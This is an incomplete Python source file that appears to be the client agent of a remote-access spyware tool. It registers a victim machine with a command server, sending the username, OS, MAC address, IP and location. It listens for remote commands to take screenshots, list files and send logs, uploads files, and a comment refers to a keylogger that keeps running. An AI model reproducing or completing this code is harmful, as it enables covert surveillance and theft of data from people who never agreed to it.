import requests
import time
import subprocess
import os
import uuid
import json
import getpass
import platform
import socket 
import threading
from http.server import HTTPServer, BaseHTTPRequestHandler
import screenshot
import config

agent_id = str(uuid.uuid4())
SERVER_URL = "http://localhost:5000"
PORT=5000

# 1. Server Function
def run_server():
    class SimpleHandler(BaseHTTPRequestHandler):
        def do_GET(self):
            content_length = int(self.headers['Content-Length'])
            # 2. Read the raw request body
            post_data = self.rfile.read(content_length)
            # 3. Parse JSON data into a dictionary
            try:
                data = json.loads(post_data.decode('utf-8'))
                print(f"Received JSON: {data}")
                #send screenshot logic
                if data['command'] == "screenshot":
                    screenshot.log_screenshot()
                elif data['command'] == "list_files":
                    config.get_files()
                elif data['command'] == "send_log":
                    config.send_log()

                # Send a successful response
                self.send_response(200)
                self.send_header('Content-type', 'application/json')
                self.end_headers()
                
                response = {"status": "success", "received": data}
                self.wfile.write(json.dumps(response).encode('utf-8'))

            except json.JSONDecodeError:
                self.send_response(400)
                self.end_headers()
                self.wfile.write(b'{"error": "Invalid JSON"}')

    server_address = ('', 8000)
    httpd = HTTPServer(server_address, SimpleHandler)
    print("Server running on port 8000...")
    try:
        httpd.serve_forever()
    except KeyboardInterrupt:
        # This catches Ctrl+C, allowing the keylogger to keep running
        print("Server stopped, but keylogger continues.")
        pass
        
def is_alive():
    response = requests.post(f"{SERVER_URL}/ping")
    print("ping")
    print(response.text)

def register():
    #first grab the ip info
    data = requests.get('https://ipinfo.io').json()
    print(f"IP: {data['ip']}, Location: {data['city']}, {data['region']}")
    ip = data['ip']
    city = data['city']
    region = data['region']
    mac = get_mac()
    user_name = getpass.getuser()
    os = platform.system()
        # Create a dictionary using these variables
    data_dict = {
        "name": user_name,
        "os": os,
        "mac":mac,
        "ip": ip,
        "port": PORT,
        "city": city,
        "region": region
    }
    
    print(data_dict)
    response = requests.post(f"{SERVER_URL}/register", json=data_dict)
    json_data = response.text
    print(json_data)

def list_files(path):
    pass

def send_file(path):
    response = requests.post(f"{SERVER_URL}/upload", data=path)
    data = response.text
    print(data)

def get_mac():
    # Returns the 48-bit integer representation of the MAC address
    mac_num = uuid.getnode()
    # Format the integer into XX:XX:XX:XX:XX:XX
    mac = ':'.join(("%012X" % mac_num)[i:i+2] for i in range(0, 12, 2))
    return mac
 
        # register()
        # time.sleep(10)


